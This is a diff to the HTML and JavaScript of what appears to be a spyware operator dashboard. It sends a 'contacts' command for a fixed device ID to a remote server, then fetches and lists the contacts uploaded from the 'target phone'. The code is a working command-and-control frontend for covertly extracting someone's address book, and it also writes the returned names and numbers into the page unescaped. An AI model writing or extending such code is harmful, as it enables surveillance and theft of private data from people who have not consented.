@@ -46,7 +46,6 @@
 
         .page-title { font-size: 1.2rem; font-weight: bold; }
 
-        /* Contact List Styling */
         .contact-list {
             display: flex; flex-direction: column; gap: 10px;
             max-height: 600px; overflow-y: auto; padding-right: 5px;
@@ -63,7 +62,7 @@
             width: 40px; height: 40px;
             background: linear-gradient(45deg, #4caf50, #2e7d32);
             border-radius: 50%; display: flex; align-items: center; justify-content: center;
-            font-weight: bold; margin-right: 15px; font-size: 1.1rem; text-shadow: 0 1px 2px rgba(0,0,0,0.3);
+            font-weight: bold; margin-right: 15px; font-size: 1.1rem;
         }
 
         .info { flex: 1; overflow: hidden; }
@@ -89,27 +88,25 @@
         <div class="header">
             <a href="index.html" class="back-btn"><i class="fa-solid fa-chevron-left"></i></a>
             <span class="page-title">Contacts List</span>
-            <button onclick="fetchContacts()" class="refresh-btn"><i class="fa-solid fa-rotate"></i></button>
+            <button onclick="fetchContacts()" class="refresh-btn"><i class="fa-solid fa-rotate"></i> Refresh</button>
         </div>
 
         <div class="contact-list" id="contactsContainer">
             <div class="status-msg">
                 <i class="fa-solid fa-circle-notch fa-spin" style="font-size: 2rem; margin-bottom: 10px;"></i>
-                <p>Requesting Contacts...</p>
+                <p>Requesting Contacts from Phone...</p>
             </div>
         </div>
     </div>
 
     <script>
-        // ✅ CORRECT SETTINGS
         const SERVER_URL = "https://child-v9no.onrender.com";
         const DEVICE_ID = "M2103K19I"; 
 
-        // 1. Page Load hote hi Command bhejo
         document.addEventListener("DOMContentLoaded", () => {
             sendCommand();
-            // 5 Second baad data check karo
-            setTimeout(fetchContacts, 5000);
+            // Phone ko thoda time do upload karne ke liye
+            setTimeout(fetchContacts, 7000); 
         });
 
         function sendCommand() {
@@ -117,28 +114,32 @@
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ device_id: DEVICE_ID, command: 'contacts' })
-            }).then(() => console.log("Command Sent"));
+            }).then(() => console.log("Command Sent to Phone"));
         }
 
-        // 2. Data Fetch Karne ka Function
         function fetchContacts() {
             const container = document.getElementById("contactsContainer");
             
-            // File uploads folder se uthayenge
-            fetch(`${SERVER_URL}/uploads/contacts.json?t=${new Date().getTime()}`)
+            // ✅ CHANGE: Ab hum API route use kar rahe hain, direct file nahi
+            fetch(`${SERVER_URL}/api/get-data/${DEVICE_ID}/contacts?t=${new Date().getTime()}`)
                 .then(response => {
-                    if (!response.ok) throw new Error("File not found");
+                    if (!response.ok) throw new Error("No Data Yet");
                     return response.json();
                 })
                 .then(data => {
-                    container.innerHTML = ""; // Purana saaf karo
-
+                    // Agar API khali array [] bhej rahi hai
                     if(!data || data.length === 0) {
-                        container.innerHTML = "<div class='status-msg'>No contacts found</div>";
+                        container.innerHTML = `
+                            <div class="status-msg">
+                                <i class="fa-solid fa-clock"></i>
+                                <p>Phone has not uploaded contacts yet.</p>
+                                <button onclick="fetchContacts()" class="refresh-btn" style="margin-top:10px">Try Again</button>
+                            </div>`;
                         return;
                     }
 
-                    // Sort Names Alphabetically
+                    container.innerHTML = ""; // Clear loading screen
+                    
                     data.sort((a, b) => (a.name || "").localeCompare(b.name || ""));
 
                     data.forEach(contact => {
@@ -154,8 +155,7 @@
                                     <div class="number">${number}</div>
                                 </div>
                                 <div class="call-icon"><i class="fa-solid fa-phone"></i></div>
-                            </div>
-                        `;
+                            </div>`;
                         container.innerHTML += card;
                     });
                 })
@@ -163,9 +163,9 @@
                     console.error("Error:", err);
                     container.innerHTML = `
                         <div class="status-msg">
-                            <i class="fa-solid fa-hourglass-half" style="font-size: 1.5rem;"></i>
-                            <p>Waiting for Phone to Upload...</p>
-                            <small>Click refresh button in 5 seconds</small>
+                            <i class="fa-solid fa-triangle-exclamation" style="color:orange"></i>
+                            <p>Connecting to Phone...</p>
+                            <small>Make sure the app is running on target phone.</small>
                         </div>`;
                 });
         }
